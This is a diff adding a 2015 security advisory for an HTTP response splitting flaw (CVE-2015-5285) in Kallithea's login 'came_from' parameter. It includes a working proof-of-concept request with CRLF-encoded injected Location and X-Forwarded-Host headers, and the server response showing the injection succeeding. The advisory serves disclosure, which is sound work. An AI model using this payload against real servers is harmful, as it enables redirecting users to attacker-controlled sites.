@@ -1,0 +1,85 @@
+﻿
+Kallithea 0.2.9 (came_from) HTTP Response Splitting Vulnerability
+
+
+Vendor: Kallithea
+Product web page: https://www.kallithea-scm.org
+Version affected: 0.2.9 and 0.2.2
+
+Summary: Kallithea, a member project of Software Freedom Conservancy,
+is a GPLv3'd, Free Software source code management system that supports
+two leading version control systems, Mercurial and Git, and has a web
+interface that is easy to use for users and admins.
+
+Desc: Kallithea suffers from a HTTP header injection (response splitting)
+vulnerability because it fails to properly sanitize user input before
+using it as an HTTP header value via the GET 'came_from' parameter in
+the login instance. This type of attack not only allows a malicious
+user to control the remaining headers and body of the response the
+application intends to send, but also allow them to create additional
+responses entirely under their control.
+
+Tested on: Kali
+           Python
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5267
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5267.php
+Vendor: https://kallithea-scm.org/news/release-0.3.html
+Vendor Advisory: https://kallithea-scm.org/security/cve-2015-5285.html
+CVE ID: 2015-5285
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5285
+
+
+21.09.2015
+
+--
+
+
+GET /_admin/login?came_from=d47b5%0d%0aX-Forwarded-Host%3a%20http://zeroscience.mk%01%02%0d%0aLocation%3a%20http://zeroscience.mk HTTP/1.1
+Host: 192.168.0.28:8080
+Content-Length: 0
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://192.168.0.28:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://192.168.0.28:8080/_admin/login?came_from=%2F
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: kallithea=3090b35b3e37ba350d71b62c240c50bf87932f0d7e6b1a600cba4e0e890b7e29e253b438
+
+###
+
+HTTP/1.1 302 Found
+Cache-Control: no-cache
+Content-Length: 411
+Content-Type: text/html; charset=UTF-8
+Date: Mon, 21 Sep 2015 13:58:05 GMT
+Location: http://192.168.0.28:8080/_admin/d47b5
+X-Forwarded-Host: http://zeroscience.mk
+Location: http://zeroscience.mk
+Pragma: no-cache
+Server: waitress
+
+<html>
+ <head>
+  <title>302 Found</title>
+ </head>
+ <body>
+  <h1>302 Found</h1>
+  The resource was found at <a href="http://192.168.0.28:8080/_admin/d47b5
+X-Forwarded-Host: http://zeroscience.mk
+Location: http://zeroscience.mk">http://192.168.0.28:8080/_admin/d47b5
+X-Forwarded-Host: http://zeroscience.mk
+Location: http://zeroscience.mk</a>;
+you should be redirected automatically.
+
+
+ </body>
+</html>
